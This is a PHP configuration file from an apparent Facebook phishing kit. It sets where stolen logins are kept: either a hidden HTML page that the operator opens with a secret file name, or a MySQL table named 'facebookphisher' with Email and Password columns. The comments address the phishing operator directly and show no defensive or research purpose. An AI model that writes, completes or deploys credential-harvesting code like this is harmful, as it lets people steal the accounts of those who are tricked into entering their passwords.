<?php


$MODE = "REPLACE_ME"; # Either "fopen" or "mysql"


# If "fopen" was chosen :-

$SECRET_FILE = "REPLACE_ME"; # YOU MUST CHANGE THIS VARIABLE. 
// DO NOT USE ANY OF THE FOLLOWING CHARACTERS	& \ / : * ? " < > | =		or space (i.e. ' ').
// it represents the html page where user/password combinations will be stored.
// you will be able to access the file through your browser directly -
// by adding your "/$SECRET_FILE.html" to the end of the url where the phishing tool is hosted (no login required).
// it basically functions like a password. make sure it's strong otherwise it can be brute-forced by some angry script kiddy.
// eg. https://example.com/facebook_phishing/$SECRET_FILE.html

function purify ($str) {
	
	return htmlentities($str, ENT_HTML5, "UTF-8");
}

# If "mysql" was chosen :-

/*
Chuck this SQL query in your mysql database to create the necessary table.


CREATE TABLE `facebookphisher` (
 `PK_FP` int(11) NOT NULL AUTO_INCREMENT,
 `Email` varchar(64) CHARACTER SET latin1 COLLATE latin1_general_cs NOT NULL,
 `Password` varchar(64) CHARACTER SET latin1 COLLATE latin1_general_cs NOT NULL,
 `Datetime` datetime NOT NULL,
 PRIMARY KEY (`PK_FP`)
) DEFAULT CHARSET=latin1;


You should also change the the variables in the class below to suit your needs.
*/

class connect{
    
    public $db_host = "localhost";
    public $db_user = "root";
    public $db_pass = "";
    public $db_name = "test";
    
    public function start_connection(){
        
        $connection =@ mysqli_connect(
            $this->db_host,
            $this->db_user,
            $this->db_pass,
            $this->db_name
            ) or exit();
            
        return $connection;
			
    }
}


?> 
